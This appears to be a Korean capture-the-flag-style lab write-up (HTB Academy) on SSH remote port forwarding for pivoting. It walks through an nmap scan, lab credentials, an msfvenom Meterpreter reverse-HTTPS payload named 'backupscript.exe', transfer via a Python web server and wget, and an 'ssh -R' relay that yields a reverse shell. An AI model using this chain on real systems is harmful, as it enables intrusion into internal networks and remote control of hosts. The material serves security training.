---
title: "Remote Port Forwarding"
date: 2025-09-29
layout: single
author_profile: true
toc: true
toc_label: "Remote Port Forwarding"
toc_icon: "network-wired"
toc_sticky: true
tags: [networking, ssh, tunneling, pivoting, reverse]
header:
  teaser: /assets/network-screenshots/remote-port-forwarding/remote-port-forwarding.png
---

**Remote(Reverse) Port Forwarding**은 로컬에서 실행 중인 서비스를 원격 SSH 서버의 특정 포트에 바인딩하여, 원격 네트워크 또는 내부망 호스트가 그 포트를 통해 해당 서비스에 접근할 수 있게 하는 기술이다. 

공격자는 SSH의 `-R` 옵션으로 피벗 호스트에 리스닝 포트를 생성하고, 이를 통해 NAT/방화벽으로 인해 직접 라우팅이 불가능한 환경에서 **역방향 연결(예: 리버스 셸)** 을 중계할 수 있다. 

이 기법은 파일 전송, 원격 명령 실행, Meterpreter 같은 리버스 세션 확보 등 직접 접속이 어려운 내부 자원에 대한 접근을 가능하게 해 자주 활용된다.

---

# Remote(Reverse) Port Forwarding

공격 호스트(`10.10.15.5`)는 **Ubuntu 서버**(`10.129.15.50`, `172.16.5.129`)에 SSH 접속이 가능하며,  
Ubuntu 서버를 통해 내부망 Windows 호스트(`172.16.5.19`)의 RDP 서비스에 접근할 수 있다.

![Remote Port Forwarding Diagram](/assets/network-screenshots/remote-port-forwarding/remote-port-forwarding.png)

그러나 Windows 호스트는 **공격 호스트(10.10.x.x)** 와 직접 라우팅이 불가능하다.  
따라서 Windows에서 **공격 호스트로 직접 Reverse Shell**을 보낼 경우 트래픽이 도달하지 못한다.

- Windows 호스트는 `172.16.5.0/23` 네트워크 안에만 트래픽을 보낼 수 있다.
- 공격자는 `10.129.x.x` (HTB Academy Lab) 네트워크에 있으며, Windows → 공격 호스트 직접 통신이 불가능하다.
- 단순 RDP 세션만으로는 **파일 업로드/다운로드** 또는 **Meterpreter 세션** 확보가 어렵다.

이러한 상황에서는 **공격자 → Ubuntu → Windows** 방향이 아닌  
**Windows → Ubuntu → 공격자** 순으로 트래픽을 **역방향(Reverse)** 으로 전달해야 한다.

---

# 실습

## Portscan

대상 Host(`10.129.243.159`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.

```bash
$ nmap -sC -sV 10.129.243.159 

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 20:10 EDT
Nmap scan report for 10.129.243.159
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.55 seconds
```

Nmap 스캔 결과 `SSH(22)`, `http(80)` 등 서비스가 확인되었다.

## 동적 포트 포워딩을 이용한 SSH 접속

Dynamic Port Forwarding 관련 절차는 별도 포스트에 있습니다 → [Dynamic Port Forwarding 포스트 보기](../dynamic-port-forwarding).

우선 문제에서 제공한 아이디/비밀번호(`ubuntu:HTB_@cademy_stdnt!`) 를 이용하여 **동적 포트 포워딩**을 이용한 SSH 접속에 시도하였다.

```bash
$ ssh -D 9050 ubuntu@10.129.243.159
```

접속 후, `ifconfig` 명령어를 통하여 내부망 인터페이스를 확인하였다.

![Domain](/assets/network-screenshots/remote-port-forwarding/ifconfig.png)

그 결과 내부망 IP 주소 `172.16.5.129` 를 확인할 수 있었다.

## msfvenom Windows Payload

로컬 호스트에서 Windows용 Meterpreter 페이로드를 생성하기 위해 `msfvenom` 명령어를 사용하였다.

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

생성한 파일은 `scp` 명령을 이용해 **SSH 내부망 인터페이스**로 전송하였다.

```bash
scp backupscript.exe ubuntu@10.129.243.159:/home/ubuntu
```

## RDP 연결 && 스크립트 파일 전달

문제에서 제공된 RDP 계정(`victor:pass@123`)을 이용해 **proxychains**를 통해 내부망 RDP에 접속하였다.

```bash
$ proxychains xfreerdp3 /v:172.16.5.19 /u:victor /p:pass@123
```

이후, SSH 세션에서 `python` 내장 웹서버를 실행하여 파일 전송용 HTTP 서비스를 열었다.

```bash
$ python3 -m http.server 9999
```

Windows RDP 세션에서 `wget` 명령을 사용해 `backupscript.exe` 파일을 다운로드하였다.

```powershell
wget http://172.16.5.129:9999/backupscript.exe -o backupscript.exe
```

성공적으로 파일을 다운로드하였다.

![Domain](/assets/network-screenshots/remote-port-forwarding/rdp-wget.png)

## Remote Port Forwarding

이후, Ubuntu 서버를 중계(pivot) 호스트로 사용하기 위해 `ssh -R` 명령어를 실행하였다.

```bash
$ ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.243.159 -vN

# (-v : verbose, -N : no command)
```

명령 실행 후, Metasploit의 `msfconsole`을 실행하여 리버스 연결을 수신할 리스너를 설정하였다.

![Domain](/assets/network-screenshots/remote-port-forwarding/msfconsole.png)

이후 RDP 세션으로 돌아가 다운로드한 `backupscript.exe` 파일을 실행하였다.

![Domain](/assets/network-screenshots/remote-port-forwarding/rdp-remote-success.png)

잠시 후, Metasploit에서 `meterpreter` 세션이 활성화되었고
`ls` 명령어를 통해 **내부 파일/디렉터리 열람이 가능함을 확인**하였다.

이를 통해 RDP 환경에서 **원격 코드 실행(Remote)** 이 성공했음을 검증할 수 있었다.

## Flag 획득

Desktop으로 이동 후 `flag.txt` 파일 내용을 읽어 플래그를 획득하였다.

![Domain](/assets/network-screenshots/remote-port-forwarding/flag.png)

이로써 **Remote(Reverse) Port Forwarding** 실습을 마무리하였다.

